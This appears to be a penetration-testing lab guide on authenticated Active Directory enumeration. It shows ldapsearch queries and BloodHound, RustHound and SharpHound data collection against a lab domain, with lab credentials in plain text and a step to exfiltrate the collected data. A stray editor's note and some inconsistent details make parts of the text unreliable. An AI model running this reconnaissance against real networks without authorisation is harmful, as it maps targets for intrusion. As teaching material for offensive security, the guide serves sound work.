
# Authenticated Enumeration

In most of the engagements I've been on, the client opts for an assumed breach scenario where the attacker has already gained access to a user account. In the previous section: `Unauthenticated Enumeration`, we have obtained the credentials for the following domain users. Their credentials are as follows (where applicable):

```
Lily_MOORE : austin1
Nathan_CARTER : Nathan_CARTER
Jacob_REYNOLDS : <kerberos_ticket>
```

In this section, we will explore how to enumerate the domain using these credentials. We will cover various tools and techniques to gather information about the domain, its users, computers, and other resources.

- [Authenticated Enumeration](#authenticated-enumeration)
  - [Lay of the Land](#lay-of-the-land)
    - [Manual LDAP Queries](#manual-ldap-queries)
      - [Computers](#computers)
      - [Users](#users)
      - [Groups](#groups)
    - [BloodHound](#bloodhound)
      - [Installation (CE)](#installation-ce)
      - [Data Collection (CE)](#data-collection-ce)
      - [Installation (Legacy)](#installation-legacy)
      - [Data Collection (Legacy)](#data-collection-legacy)
      - [Limitations](#limitations)
    - [PowerView](#powerview)
      - [Computers](#computers-1)
      - [Users](#users-1)
      - [Groups](#groups-1)
  - [Network Mapping](#network-mapping)
  - [Password Spraying (Internal)](#password-spraying-internal)
  - [SMB Share Enumeration](#smb-share-enumeration)


## Lay of the Land

With domain credentials, we can start by understanding the layout of the domain. This includes gathering information about domain controllers, computers, password policies, organizational structure, and service principal names (SPNs).

### Manual LDAP Queries

When first gaining access to a domain, we don't immediately want to run automated tools and start overwhelming ourselves with information. Instead, we can start with manual LDAP queries to gather basic information about the domain. This can be done using tools like `ldapsearch`.

#### Computers

To list all computers in the domain, we can use the following query:

```bash
> ldapsearch -x -H ldap://dc02.asia.earth.local -D "ASIA\Lily_MOORE" -w "austin1" -b "DC=asia,DC=earth,DC=local" "(objectClass=computer)" dNSHostName | grep "^dNSHostName" | cut -d' ' -f2-

dc02.asia.earth.local
web01.asia.earth.local
dev-pc001.asia.earth.local
dev-pc002.asia.earth.local
dev-pc003.asia.earth.local
fs01.asia.earth.local
sql01.asia.earth.local
pt01.asia.earth.local
staging01.asia.earth.local
```

To query the DC for all of the above computers, we can pipe the output to `xargs` and run a query for each computer against the domain controller (assuming they are the primary DNS server):

```bash
> ldapsearch -x -H ldap://dc02.asia.earth.local -D "ASIA\Lily_MOORE" -w "austin1" -b "DC=asia,DC=earth,DC=local" "(objectClass=computer)" dNSHostName | grep "^dNSHostName" | cut -d' ' -f2- | xargs -I {} sh -c 'ip=$(dig {} @dc02.asia.earth.local +short); echo "$ip {}"'

10.5.10.20 dc02.asia.earth.local
10.5.10.30 web01.asia.earth.local
10.5.10.40 dev-pc001.asia.earth.local
10.5.10.41 dev-pc002.asia.earth.local
10.5.10.42 dev-pc003.asia.earth.local
10.5.10.50 fs01.asia.earth.local
10.5.10.60 sql01.asia.earth.local
10.5.10.70 pt01.asia.earth.local
10.5.20.74 staging01.asia.earth.local
```

To get the operating system of each computer, we can modify the query to include the `operatingSystem` attribute:

```bash
ldapsearch -x -H ldap://dc02.asia.earth.local -D "ASIA\Lily_MOORE" -w "austin1" -b "DC=asia,DC=earth,DC=local" "(objectClass=computer)" dNSHostName operatingSystem | grep -E "^(dNSHostName|operatingSystem):" | cut -d' ' -f2- | sed '0~2 a\\'

Windows Server 2022 Standard Evaluation
dc02.asia.earth.local

Windows Server 2022 Standard Evaluation
web01.asia.earth.local

Windows Server 2022 Standard Evaluation
dev-pc001.asia.earth.local

Windows Server 2022 Standard Evaluation
dev-pc002.asia.earth.local

Windows Server 2022 Standard Evaluation
dev-pc003.asia.earth.local

Windows Server 2022 Standard Evaluation
fs01.asia.earth.local

Windows Server 2022 Standard Evaluation
sql01.asia.earth.local

Windows Server 2022 Standard Evaluation
pt01.asia.earth.local

pc-linux-gnu
staging01.asia.earth.local
```

#### Users

We can get a list of users in the domain using a similar query, however this will inevitably return a large number of results.

```bash
ldapsearch -x -H ldap://dc02.asia.earth.local -D "ASIA\Lily_MOORE" -w "austin1" -b "DC=asia,DC=earth,DC=local" "(objectClass=user)" sAMAccountName | grep "^sAMAccountName" | cut -d' ' -f2-
```

A more targeted query can be used to find users with specific attributes, such as those who are members of a privileged group (`adminCount=1`):

```bash
ldapsearch -x -H ldap://dc02.asia.earth.local -D "ASIA\Lily_MOORE" -w "austin1" -b "DC=asia,DC=earth,DC=local" "(&(objectClass=user)(adminCount=1))" sAMAccountName | grep "^sAMAccountName" | cut -d' ' -f2-         

Administrator
krbtgt
async_adm
T0-H.WANG
T0-J.ZHANG
T0-L.CHEN
T0-Y.LIU
T0-M.HUANG
T0-Z.LEE
```

We can also look for service accounts, which are users with a `servicePrincipalName` attribute that are used to run services or applications:

```bash
ldapsearch -x -H ldap://dc02.asia.earth.local -D "ASIA\Lily_MOORE" -w "austin1" -b "DC=asia,DC=earth,DC=local" "(&(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=*$)))" sAMAccountName servicePrincipalName | grep -E "^(sAMAccountName|servicePrincipalName):" 

sAMAccountName: krbtgt
servicePrincipalName: kadmin/changepw
sAMAccountName: svc_sql
servicePrincipalName: MSSQLSvc/SQL01.asia.earth.local:1433
servicePrincipalName: MSSQLSvc/SQL01.asia.earth.local
```

`krbtgt` will always be present in a domain, as they are used to sign Kerberos tickets. The `svc_sql` account is a service account used to run SQL Server on the `SQL01` machine, which we additionally enumerated earlier.

Earlier, we performed an asreproasting attack against `Lily_MOORE`. We can enumerate for other users with the `DoesNotRequirePreAuth` flag set, which indicates that the user can be targeted for asreproasting - unfortunately in this case, there are no other users with this flag set:

```bash
ldapsearch -x -H ldap://dc02.asia.earth.local -D "ASIA\Lily_MOORE" -w "austin1" -b "DC=asia,DC=earth,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName | grep "^sAMAccountName" | cut -d' ' -f2-

Lily_MOORE
```

#### Groups

OUs give us a clear picture of how the domain is organized and where users and computers are placed within that structure. On the other hand, groups show us how access and privileges are managed. For example, the following LDAP query will return all OUs and groups in the domain:

You may also notice that there are some security groups suffixed with a `Tier`, for example `T1 Access Accounts`. This may be important later on, as it indicates that the domain at least attempts to use a tiered access model, commonly known as [Privileg]ed Access Management (PAM)](http://www.beyondtrust.com/resources/glossary/privileged-access-management-pam).

```bash
ldapsearch -x -H ldap://dc02.asia.earth.local -D "ASIA\Lily_MOORE" -w "austin1" -b "DC=asia,DC=earth,DC=local" "(|(objectClass=organizationalUnit)(objectClass=Group))" dn | grep "dn:" | cut -d' ' -f2-

[...snip...]
CN=T1 Access Accounts,CN=Users,DC=asia,DC=earth,DC=local
CN=T2 APAC Leads,CN=Users,DC=asia,DC=earth,DC=local
CN=T1 Web Developers,CN=Users,DC=asia,DC=earth,DC=local
CN=T1 Infrastructure Administrators,CN=Users,DC=asia,DC=earth,DC=local
CN=T2 Database Administrators,CN=Users,DC=asia,DC=earth,DC=local
CN=Engineering,CN=Users,DC=asia,DC=earth,DC=local
CN=Data Analytics,CN=Users,DC=asia,DC=earth,DC=local
CN=Security Operations,CN=Users,DC=asia,DC=earth,DC=local
CN=Product Development,CN=Users,DC=asia,DC=earth,DC=local
CN=Network Engineers,CN=Users,DC=asia,DC=earth,DC=local
CN=Security Analysts,CN=Users,DC=asia,DC=earth,DC=local
CN=App Developers,CN=Users,DC=asia,DC=earth,DC=local
CN=Cloud Infrastructure,CN=Users,DC=asia,DC=earth,DC=local
CN=Data Operations,CN=Users,DC=asia,DC=earth,DC=local
CN=System Architects,CN=Users,DC=asia,DC=earth,DC=local
CN=DevOps Engineers,CN=Users,DC=asia,DC=earth,DC=local
CN=Compliance Team,CN=Users,DC=asia,DC=earth,DC=local
CN=Platform Services,CN=Users,DC=asia,DC=earth,DC=local
CN=Quality Assurance,CN=Users,DC=asia,DC=earth,DC=local
CN=Business Intel,CN=Users,DC=asia,DC=earth,DC=local
CN=Technical Writers,CN=Users,DC=asia,DC=earth,DC=local
CN=Titan Research,CN=Users,DC=asia,DC=earth,DC=local
CN=Europa Labs,CN=Users,DC=asia,DC=earth,DC=local
CN=Ganymede Systems,CN=Users,DC=asia,DC=earth,DC=local
CN=Phobos Security,CN=Users,DC=asia,DC=earth,DC=local
CN=Deimos Control,CN=Users,DC=asia,DC=earth,DC=local
CN=Ceres Mining,CN=Users,DC=asia,DC=earth,DC=local
CN=Vesta Operations,CN=Users,DC=asia,DC=earth,DC=local
CN=Enceladus Research,CN=Users,DC=asia,DC=earth,DC=local
CN=Callisto Command,CN=Users,DC=asia,DC=earth,DC=local
CN=Triton Networks,CN=Users,DC=asia,DC=earth,DC=local
CN=Linux Administrators,CN=Users,DC=asia,DC=earth,DC=local
CN=T0 Fileshare Administrators,CN=Users,DC=asia,DC=earth,DC=local
CN=migrated devs,CN=Users,DC=asia,DC=earth,DC=local
CN=Tier-0 Global Administrators,CN=Users,DC=asia,DC=earth,DC=local
OU=Domain Controllers,DC=asia,DC=earth,DC=local
```

### BloodHound

By far, the most popular tool for enumerating Active Directory is [BloodHound](https://github.com/SpecterOps/BloodHound). The tool allows us to visualize the relationships and permissions within the domain, making it easier to identify potential attack paths. BloodHound has 2 products: `Enterprise` and `Community Edition`. The Enterprise Edition is a paid product that provides additional features, while the Community Edition is free and open-source.

However, many people still prefer using the [`Legacy` version of BloodHound](https://github.com/SpecterOps/BloodHound-Legacy), which was the original version of the tool. The Legacy version is still available, but is no longer being maintained nor updated. We will primarily be using `BloodHound Legacy` for this lab, as we have found it to be more stable and easier to run. However, we will also provide instructions for using the `Community Edition` of BloodHound.

These days, data collection can use either Legacy or Collector’s Edition. Most tools were built for Legacy at first, but they’ve been updated to support CE too. So the process depends on which type the environment is using. If an import error were to occur, this would most likely be the reason so make sure to use the correct collector.

In [BloodHound-Legacy](https://github.com/SpecterOps/BloodHound-Legacy), Neo4j is a required dependency that you must install and manage yourself, whereas in [BloodHound-CE](https://github.com/SpecterOps/BloodHound), Neo4j is also used but comes pre-configured and is automatically set up for you as part of the Docker Compose environment, making the setup process much simpler.

There are _some_ disadvantages 

A key disadvantage of BloodHound is performance limitations: the collector can take extremely long to gather data in large environments and may cause system instability; data import processes can be painfully time-consuming; and the graph visualization and analysis capabilities are often constrained by your hardware resources, especially when dealing with complex Active Directory environments with numerous ACLs.

#### Installation (Legacy)


```dockerfile
  graph-db:
    profiles:
      - dev
      - api-only
      - ui-only
      - debug-api
      - sso
    build:
      args:
        memconfig: true
      context: tools/docker-compose
      dockerfile: neo4j.Dockerfile
```

```dockerfile
FROM docker.io/library/neo4j:4.4.42 as base

ARG memconfig

RUN echo "dbms.security.auth_enabled=false" >> /var/lib/neo4j/conf/neo4j.conf && \
    # Restrict allowed procedures only to what is used to mitigate CVE-2023-23926
    echo "dbms.security.procedures.unrestricted=apoc.periodic.*,*.specterops.*" >> /var/lib/neo4j/conf/neo4j.conf && \
    echo "dbms.security.procedures.allowlist=apoc.periodic.*,*.specterops.*" >> /var/lib/neo4j/conf/neo4j.conf

RUN if [ "$memconfig" = "true" ]; then neo4j-admin memrec >> /var/lib/neo4j/conf/neo4j.conf; fi

RUN cp /var/lib/neo4j/labs/apoc-4.4.0.36-core.jar /var/lib/neo4j/plugins/apoc-4.4.0.36-core.jar
```

First, we install [`neo4j`](https://neo4j.com/):

```bash
sudo apt install neo4j
```

Then, start the application (you may have to run as `root`):

```bash
sudo neo4j start

Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:194445). It is available at http://localhost:7474
There may be a short delay until the server is ready.

```

When neo4j starts navigate to the link given

![[Authenticated access-20250624020615421.webp|807]]


When prompted you will be requested to connect to the database, the credentials are `neo4j:neo4j`

moving forward another prompt for a password reset will present itself, this new password will be used to login through bloodhound. 

Now, let’s install the BloodHound GUI itself. The kali apt repository has a copy of the BloodHound legacy GUI.

```bash
sudo apt install bloodhound
```

This automatically downloads the legacy version and its key dependency neo4j, The second method would be heading to The [Bloodhound Legacy](https://github.com/SpecterOps/BloodHound-Legacy/releases) repository and then download the latest release file, After doing so unzip the folder and run it with the `--no-sandbox` flag,   

```
./Bloodhound --no-sandbox
```


#### Data Collection (Legacy)


The first method involves using `bloodhound-python`, which we previously ran with the CE collector. If you encounter the following error:

```
bloodhound-python -d asia.earth.local -u 'async_testuser-001' -p 'P@ssw0rd' -c all --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
ERROR: Could not find a domain controller. Consider specifying a domain and/or DNS server.
```

A simple solution would be to use the `-ns` flag to set the DC as the nameserver.

```
bloodhound-python -d asia.earth.local -u 'async_testuser-001' -p 'P@ssw0rd' -c all -ns 10.5.10.20 --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: asia.earth.local
Traceback (most recent call last):
  File "/home/kali/.local/bin/bloodhound-python", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/kali/.local/share/pipx/venvs/bloodhound/lib/python3.13/site-packages/bloodhound/__init__.py", line 314, in main
    ad.dns_resolve(domain=args.domain, options=args)
    ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodhound/lib/python3.13/site-packages/bloodhound/ad/domain.py", line 726, in dns_resolve
    q = self.dnsresolver.query(query.replace('pdc','gc'), 'SRV', tcp=self.dns_tcp)
  File "/home/kali/.local/share/pipx/venvs/bloodhound/lib/python3.13/site-packages/dns/resolver.py", line 1363, in query
    return self.resolve(
           ~~~~~~~~~~~~^
        qname,
        ^^^^^^
    ...<7 lines>...
        True,
        ^^^^^
    )
    ^
  File "/home/kali/.local/share/pipx/venvs/bloodhound/lib/python3.13/site-packages/dns/resolver.py", line 1320, in resolve
    timeout = self._compute_timeout(start, lifetime, resolution.errors)
  File "/home/kali/.local/share/pipx/venvs/bloodhound/lib/python3.13/site-packages/dns/resolver.py", line 1076, in _compute_timeout
    raise LifetimeTimeout(timeout=duration, errors=errors)
dns.resolver.LifetimeTimeout: The resolution lifetime expired after 3.104 seconds: Server Do53:10.5.10.20@53 answered The DNS operation timed out.

```

A common issue with `bloodhound-python` in multi-domain environments is DNS resolution failure, which can be easily avoided by appending a trailing `.` to the domain name to force FQDN resolution, this behavior was later addressed in [PR #196](https://github.com/dirkjanm/BloodHound.py/pull/196).

```
bloodhound-python -d asia.earth.local. -u 'async_testuser-001' -p 'P@ssw0rd' -ns 10.5.10.20 -c all --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: asia.earth.local
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc02.asia.earth.local
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 9 computers
INFO: Connecting to LDAP server: dc02.asia.earth.local
INFO: Connecting to GC LDAP server: dc02.asia.earth.local
INFO: Found 800 users
INFO: Found 83 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: staging01.asia.earth.local
INFO: Querying computer: pt01.asia.earth.local
INFO: Querying computer: sql01.asia.earth.local
INFO: Querying computer: fs01.asia.earth.local
INFO: Querying computer: dev-pc003.asia.earth.local
INFO: Querying computer: dev-pc002.asia.earth.local
INFO: Querying computer: dev-pc001.asia.earth.local
INFO: Querying computer: web01.asia.earth.local
INFO: Querying computer: dc02.asia.earth.local
INFO: Done in 01M 37S
INFO: Compressing output into 20250624011824_bloodhound.zip
```


NetExec was supposed to be the second method of data collection. It no longer supports Legacy BloodHound collectors as of [April 27th, 2024](https://github.com/Pennyw0rth/NetExec/pull/664), focusing entirely on Collector’s Edition for data collection moving forward. 


The Third option which works is Rusthound

```
rusthound --domain asia.earth.local -u 'async_testuser-001' -p 'P@ssw0rd' -n 10.2.10.20 -z

---------------------------------------------------
Initializing RustHound at 01:20:41 on 06/24/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-06-24T05:20:41Z INFO  rusthound] Verbosity level: Info
[2025-06-24T05:20:41Z INFO  rusthound::ldap] Connected to ASIA.EARTH.LOCAL Active Directory!
[2025-06-24T05:20:41Z INFO  rusthound::ldap] Starting data collection...
[2025-06-24T05:20:44Z INFO  rusthound::ldap] All data collected for NamingContext DC=asia,DC=earth,DC=local
[2025-06-24T05:20:44Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2025-06-24T05:20:44Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[2025-06-24T05:20:45Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2025-06-24T05:20:45Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2025-06-24T05:20:45Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2025-06-24T05:20:45Z INFO  rusthound::json::maker] 801 users parsed!
[2025-06-24T05:20:45Z INFO  rusthound::json::maker] 91 groups parsed!
[2025-06-24T05:20:45Z INFO  rusthound::json::maker] 9 computers parsed!
[2025-06-24T05:20:45Z INFO  rusthound::json::maker] 1 ous parsed!
[2025-06-24T05:20:45Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-06-24T05:20:45Z INFO  rusthound::json::maker] 2 gpos parsed!
[2025-06-24T05:20:45Z INFO  rusthound::json::maker] 21 containers parsed!
[2025-06-24T05:20:45Z INFO  rusthound::json::maker] .//20250624012045_asia-earth-local_rusthound.zip created!

RustHound Enumeration Completed at 01:20:45 on 06/24/25! Happy Graphing!

```



#### Installation (CE)

BloodHound Community Edition (BHCE) runs as a docker container, and the installation process is relatively straightforward. The following steps will guide you through the installation process:

1. Ensure that `docker` is installed, ideally `docker compose` is also available.
2. Download the latest release of **[Bloodhound CLI](https://github.com/SpecterOps/bloodhound-cli/releases)**.

```bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
```

3. Extract the tarball

```
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
```

4. Run the CLI tool with the `install` flag

```
./bloodhound-cli install
```

5. After the installation is complete, pay attention to the console as the password is printed

```
 Container bloodhound-graph-db-1  Created
 Container bloodhound-bloodhound-1  Creating
 Container bloodhound-bloodhound-1  Created
 Container bloodhound-graph-db-1  Starting
 Container bloodhound-app-db-1  Starting
 Container bloodhound-app-db-1  Started
 Container bloodhound-graph-db-1  Started
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: aW90ZF8[redacted]UyCz3QJSvBhL
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

**DISCLAIMER:** If you forget your password, use the following utility to reset it:

```bash
./bloodhound-cli resetpwd
```

1. Navigate to `http://127.0.0.1:8080/ui/login` and login with the credentials provided once the setup process was completed

Data ingestion for both Community Edition (CE) and legacy do not use the same collector as they are in different formats, hence we will cover the data collection process for both CE and legacy separately.

#### Data Collection (CE)

**Option 1: Remote Collection**

There are multiple types of collectors to use depending on if you want them to be run on the endpoint (Windows), or whether they can be run remotely (through a proxy). 

```bash
python3 -m pip install pipx
pipx install bloodhound-ce

  installed package bloodhound-ce 1.8.0, installed using Python 3.13.3
  These apps are now globally available
    - bloodhound-ce-python
done! ✨ 🌟 ✨
```

To then use Bloodhound-ce-python its the same syntax as the normal bloodhound-python

```bash
bloodhound-ce-python -d asia.earth.local. -u 'async_testuser-001' -p 'P@ssw0rd' -ns 10.5.10.20 -c all --zip
```

If you find that the DNS lookup is taking too long:

```bash
bloodhound-ce-python -d asia.earth.local. -u 'async_testuser-001' -p 'P@ssw0rd' -c all --zip

INFO: BloodHound.py for BloodHound Community Edition
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (ASIA.EARTH.LOCAL.:88)] [Errno -2] Name or service not known
ERROR: Could not find a domain controller. Consider specifying a domain and/or DNS server.
```

A fix to this would be the same as `bloodhound-python`, its adding the name server flag `-ns` and a `--dns-timeout` flag if your in a high latency environment

```bash
bloodhound-ce-python -d asia.earth.local. -u 'async_testuser-001' -p 'P@ssw0rd' -ns 10.5.10.20 -c all --zip --dns-timeout 60

INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: asia.earth.local
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc02.asia.earth.local
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 9 computers
INFO: Connecting to LDAP server: dc02.asia.earth.local
INFO: Connecting to GC LDAP server: dc02.asia.earth.local
INFO: Found 800 users
INFO: Found 83 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: staging01.asia.earth.local
INFO: Querying computer: pt01.asia.earth.local
INFO: Querying computer: sql01.asia.earth.local
INFO: Querying computer: fs01.asia.earth.local
INFO: Querying computer: dev-pc003.asia.earth.local
INFO: Querying computer: dev-pc002.asia.earth.local
INFO: Querying computer: dev-pc001.asia.earth.local
INFO: Querying computer: web01.asia.earth.local
INFO: Querying computer: dc02.asia.earth.local
INFO: Done in 01M 04S
INFO: Compressing output into 20250624200808_bloodhound.zip

```

If running through a proxy, or a tunnel that doesn't support UDP. so its best to use the `--dns-tcp` flag

```bash
bloodhound-ce-python -d asia.earth.local. -u 'async_testuser-001' -p 'P@ssw0rd' -ns 10.5.10.20 -c all --zip --dns-timeout 60 --dns-tcp

INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: asia.earth.local
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc02.asia.earth.local
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 9 computers
INFO: Connecting to LDAP server: dc02.asia.earth.local
INFO: Connecting to GC LDAP server: dc02.asia.earth.local
INFO: Found 800 users
INFO: Found 83 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: staging01.asia.earth.local
INFO: Querying computer: pt01.asia.earth.local
INFO: Querying computer: sql01.asia.earth.local
INFO: Querying computer: fs01.asia.earth.local
INFO: Querying computer: dev-pc003.asia.earth.local
INFO: Querying computer: dev-pc002.asia.earth.local
INFO: Querying computer: dev-pc001.asia.earth.local
INFO: Querying computer: web01.asia.earth.local
INFO: Querying computer: dc02.asia.earth.local
INFO: Done in 01M 00S
INFO: Compressing output into 20250624063821_bloodhound.zip
```

**Installing Rusthound**

`RustHound` is another collector that I frequently use, that collects LDAP information at a much faster rate than `Bloodhound-Python`, and is also written in Rust, which makes it more efficient.

```bash
git clone https://github.com/g0h4n/RustHound-CE.git
> output

cd Rusthound-CE
make install
> output
```

```
rusthound-ce -d asia.earth.local -u 'async_testuser-001' -p 'P@ssw0rd' --zip
```

**NetExec**

Another collector that you can use, [nxc uses CE by default as of April 27th](https://github.com/Pennyw0rth/NetExec/pull/664). This can be used 

```
nxc ldap DC02.asia.earth.local. -u 'T1-J.BARTOLEMO' -p 'Jp@ssW0rd!@' --bloodhound -c all
```



> fix this ^^^^^
> Sawyer: suicide

**Option 2: Local Collection**

[SharpHound](https://github.com/SpecterOps/SharpHound/releases) latest version is always compatible with CE, faster, more updated, officially supported.

```
wget https://github.com/SpecterOps/SharpHound/releases/download/v2.6.7/SharpHound_v2.6.7_windows_x86.zip
unzip sharphound-v2.6.7_windows_x86.zip
```

![](./assets/Bloodhound-20250623144102201.png)

![](./assets/Bloodhound-20250623144321152.png)

![](./assets/Bloodhound-20250623145035890.png)


Using SSH is best when using SharpHound

```
PS C:\Users\async_testuser-001\Downloads> .\SharpHound.exe -c all 
2025-06-24T13:33:09.0051841+08:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-06-24T13:33:09.1457890+08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2025-06-24T13:33:09.1927010+08:00|INFORMATION|Initializing SharpHound at 1:33 PM on 6/24/2025
2025-06-24T13:33:09.2551774+08:00|INFORMATION|Resolved current domain to asia.earth.local
2025-06-24T13:33:09.4113482+08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2025-06-24T13:33:09.5364227+08:00|INFORMATION|Beginning LDAP search for asia.earth.local
[...CUT...]
2025-06-24T13:33:31.7551167+08:00|INFORMATION|Status: 1132 objects finished (+1132 51.45454)/s -- Using 65 MB RAM
2025-06-24T13:33:31.7551167+08:00|INFORMATION|Enumeration finished in 00:00:22.2371609
2025-06-24T13:33:31.8644890+08:00|INFORMATION|Saving cache with stats: 97 ID to type mappings.
 4 name to SID mappings.
 8 machine sid mappings.
 7 sid to domain mappings.
 0 global catalog mappings.
2025-06-24T13:33:31.8957940+08:00|INFORMATION|SharpHound Enumeration Completed at 1:33 PM on 6/24/2025! Happy Graphing!
PS C:\Users\async_testuser-001\Downloads> ls


    Directory: C:\Users\async_testuser-001\Downloads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/24/2025   1:33 PM          65280 20250624133321_BloodHound.zip
-a----         6/24/2025  10:19 AM        1286656 SharpHound.exe
-a----         6/24/2025   1:27 PM        1582265 SharpHound.ps1
-a----         6/24/2025   1:33 PM           6970 YmE2Nzk0MjYtNzA0Ny00NDQ5LTg3MTQtNGM1N2I3ODA3OWZk.bin
```

```
  --ldapusername             Username for LDAP

  --ldappassword             Password for LDAP
```

Once the zip file is saved, exfiltrate it to your host machine and then (if your bloodhound CE is empty) click on the file ingest button within the "No data available" pop up 

![](./assets/Bloodhound-20250623152728874.png)

Then, to get to the upload section click on the upload file button

![](./assets/Bloodhound-20250623152822400.png)

Next, drop your files in.

![](./assets/Bloodhound-20250623153535577.png)

Click on upload

![](./assets/Bloodhound-20250623153613935.png)

On the popup, click "upload"

![](./assets/Bloodhound-20250623153644408.png)


Now `BloodHound` is in the process of ingesting the collected data, this process usually about a minute but can vary in speed depending on the size of the domain.

![](./assets/Bloodhound-20250623153745019.png)

Now the ingesting process is completed!

![](./assets/Bloodhound-20250623155803268.png)

Now we can head over to the explore page and look at the queries present to explore the domain.

![](./assets/Bloodhound-20250623155917462.png)

#### Limitations

As mentioned previously, BloodHound has significant performance limitations when dealing with large domains, the graph theory processing becomes constrained by hardware capabilities, and both collection and import processes take substantially longer to complete.


We'll go into more detail on the limitations of BloodHound in `Active Directory Attacks`, however one of the main limitations is that `BloodHound` _can_ miss some relationships and permissions! It's important to not solely rely on BloodHound for enumeration, and to also perform manual enumeration and verification of the data collected.

The following snippet from the `Bloodhound CE` repository is an enum declaration that defines a set of named constants associated with all possible nodes that can be drawn by `BloodHound`:

```typescript
// https://github.com/SpecterOps/BloodHound/blob/main/packages/javascript/bh-shared-ui/src/graphSchema.ts
export enum ActiveDirectoryRelationshipKind {
    Owns = 'Owns',
    GenericAll = 'GenericAll',
    GenericWrite = 'GenericWrite',
    WriteOwner = 'WriteOwner',
    WriteDACL = 'WriteDacl',
    MemberOf = 'MemberOf',
    ForceChangePassword = 'ForceChangePassword',
    AllExtendedRights = 'AllExtendedRights',
    AddMember = 'AddMember',
    HasSession = 'HasSession',
    Contains = 'Contains',
    GPLink = 'GPLink',
    AllowedToDelegate = 'AllowedToDelegate',
    CoerceToTGT = 'CoerceToTGT',
    GetChanges = 'GetChanges',
    GetChangesAll = 'GetChangesAll',
    GetChangesInFilteredSet = 'GetChangesInFilteredSet',
    CrossForestTrust = 'CrossForestTrust',
    SameForestTrust = 'SameForestTrust',
    SpoofSIDHistory = 'SpoofSIDHistory',
    AbuseTGTDelegation = 'AbuseTGTDelegation',
    AllowedToAct = 'AllowedToAct',
    AdminTo = 'AdminTo',
    CanPSRemote = 'CanPSRemote',
    CanRDP = 'CanRDP',
    ExecuteDCOM = 'ExecuteDCOM',
    HasSIDHistory = 'HasSIDHistory',
    AddSelf = 'AddSelf',
    DCSync = 'DCSync',
    ReadLAPSPassword = 'ReadLAPSPassword',
    ReadGMSAPassword = 'ReadGMSAPassword',
    DumpSMSAPassword = 'DumpSMSAPassword',
    SQLAdmin = 'SQLAdmin',
    AddAllowedToAct = 'AddAllowedToAct',
